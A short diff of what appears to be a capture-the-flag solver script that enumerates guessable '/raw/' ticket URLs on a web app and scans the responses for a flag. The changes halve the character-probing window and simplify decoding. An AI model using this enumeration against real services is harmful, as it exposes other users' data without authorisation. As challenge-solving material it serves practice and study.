@@ -20,7 +20,7 @@ def find_flag(text: str):
 def get_char_set():
     char_set = set()
     start_time = time.time()
-    while time.time() - start_time < 30:
+    while time.time() - start_time < 15:
         response = session.post(NEW_TICKET_URL, data={"title": "test", "content": "test"})
         last_char = response.url[-1]
         char_set.add(last_char)
@@ -39,8 +39,7 @@ def main():
         url = BASE_URL + f"/raw/{generate_endpoint(num1, num2)}"
         print(f"🔗 Visiting {num1}:{num2}, {url = }")
         response = session.get(url)
-        response_text = response.content.decode("utf-8", "ignore")
-        find_flag(response_text)
+        find_flag(response.text)
 
         if response.status_code == 429:
             continue
